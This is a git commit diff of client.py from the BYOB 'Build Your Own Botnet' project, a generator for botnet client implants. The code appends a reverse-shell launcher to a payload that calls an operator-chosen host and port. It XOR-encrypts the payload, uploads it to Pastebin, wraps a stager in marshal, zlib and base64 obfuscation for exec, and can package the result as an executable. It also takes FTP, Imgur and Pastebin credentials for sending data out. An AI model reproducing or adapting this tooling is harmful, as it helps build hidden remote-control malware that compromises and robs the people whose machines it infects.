79a53436c0b9e6fe18153cccdae643b87b43a697
colental <30509968+colental@users.noreply.github.com>
2018-05-07 00:04:14 -0700

    Update client.py

--- byob/client.py
+++ byob/client.py
@@ -7,6 +7,7 @@ Copyright (c) 2018 Daniel Vega-Myhre
 from __future__ import print_function
 
 # standard library
+
 import os
 import sys
 import json
@@ -19,17 +20,20 @@ import colorama
 import argparse
 import subprocess
 
-# byob
+# modules
+
 try:
     from modules import security, util
-except:
-    from .modules import security, util
-
+except ImportError:
+    try:
+        from .modules import security, util
+    except ImportError:
+        pass
 
 colorama.init(autoreset=False)
 
 
-def exe(options, filename):
+def exe(options, filename, payload='modules/payload.py'):
     try:
         filename= os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', filename)
         pyname  = os.path.basename(filename)
@@ -37,7 +41,7 @@ def exe(options, filename):
         dist    = os.path.dirname(filename)
         key     = util.variable(16)
         icon    = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
-        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open('modules/payload.py','r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
+        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(payload,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
         spec    = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
         fspec   = os.path.join(dist, name + '.spec')
         with file(fspec, 'w') as fp:
@@ -46,8 +50,8 @@ def exe(options, filename):
         exe   = os.path.join(os.path.join(dist, 'dist'), name + ('.exe' if os.name == 'nt' else ''))
         _  = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
         return exe
-    except Exception as e3:
-        util.debug('exe error: {}'.format(str(e3)))
+    except Exception as e:
+        util.debug('exe error: {}'.format(str(e)))
 
 
 def app(options, filename):
@@ -79,13 +83,8 @@ def app(options, filename):
         util.debug("app error: {}".format(str(e)))
 
 
-def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwargs):
-        api = {}
-        for k,v in kwargs.items():
-            if k in ('imgur', 'ftp', 'paste'):
-                if v:
-                    api[k] = v.split(',')
-            
+def py(options, payload='modules/payload.py', stager='modules/stager.py'):
+    
         key = base64.b64encode(os.urandom(16))
 
         if options.name:
@@ -96,58 +95,48 @@ def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwar
             path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % util.variable(3))
 
         with open(payload, 'r') as fp:
-            payload = fp.read()            
+            load = fp.read()            
 
-        host    = options.host
-        port    = options.port
-        payload = payload + "\n\nif __name__ == '__main__':\n    _shell = shell(host='{}', port={}, **{})\n    _shell.run()".format(host, port, json.dumps(api))
-        code    = security.encrypt_xor(payload, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding='\x00')
-        diff    = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
+        load = load + "\n\nif __name__ == '__main__':\n    _shell = shell(host='{}', port={}, **{})\n    _shell.run()".format(options.host, options.port, json.dumps({k:v for k, v in options._get_kwargs() if k in ('ftp','imgur','paste')}))
+        code = security.encrypt_xor(load, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding='\x00')
+        diff = round(float(100.0 * float(float(len(code))/float(len(load)) - 1.0)))
 
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
-        print(colorama.Fore.RESET + colorama.Style.DIM    + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")))
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(load), 'increased' if len(code) > len(load) else 'reduced', len(code), diff, 'larger' if len(code) > len(load) else 'smaller').ljust(80 - len("[+] ")))
 
-        payload = code
-        new_url = util.pastebin(payload)
+        load = code
+        urls = util.pastebin(load)
 
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
-        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(payload), new_url).ljust(80 - len("[+] ")))
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(load), urls).ljust(80 - len("[+] ")))
 
         with open(stager, 'r') as fp:
-            stager  = fp.read().replace('__KEY__', key).replace('__PAYLOAD__', new_url)
+            stag = fp.read().replace('__KEY__', key).replace('__PAYLOAD__', urls)
             
-        code    = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
-        diff    =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+        code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stag, '', 'exec')), 9))))
+        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stag)))))
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
-        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stag), 'increased' if len(code) > len(stag) else 'reduced', len(code), diff, 'larger' if len(code) > len(stag) else 'smaller').ljust(80 - len("[+] ")))
 
-        stager  = code
+        stag = code
         with file(path, 'w') as fp:
-            fp.write(stager)
+            fp.write(stag)
             
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
-        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   
-
-        if options.type == 'exe':
-            path = exe(options, path)
-        elif options.type == 'app':
-            path = app(options, path)
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stag), path).ljust(80 - len("[+] ")))   
         return path
 
     
 def main():
-        parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
-        parser.add_argument('type', action='store', help='python, executable, app bundle', choices=['py','exe','app'])
-        parser.add_argument('host', action='store', type=str, help='server host')
-        parser.add_argument('port', action='store', type=int, help='server port')
-        parser.add_argument('--ftp', action='store', type=str, help='FTP host, username, password')
-        parser.add_argument('--name', action='store', help='output file base name')
-        parser.add_argument('--icon', action='store', help='*.ico, *.png, *.icns image file')
-        parser.add_argument('--imgur', action='store', type=str, help='Imgur API key')
-        parser.add_argument('--paste', action='store', type=str, help='Pastebin API key')
+        parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.2')
+        parser.add_argument('host', action='store', type=str, help='server IP to connect to', default='localhost')
+        parser.add_argument('port', action='store', type=int, help='port number for connection', default=1337)
+        parser.add_argument('--name', action='store', type=str, help='Output file name')
+        parser.add_argument('--icon', action='store', type=str, help='Output file icon')
+        parser.add_argument('--api', dest='key-value', type=str, help='API key name and value', action='store')
+        parser.add_argument('--ftp', dest='host-user-pass', type=str, help='FTP login credentials', action='store')
         options = parser.parse_args()
-        kwargs  = dict(options._get_kwargs())
-        return py(options, **kwargs)
+        return py(options)
 
 if __name__ == '__main__':
     main()
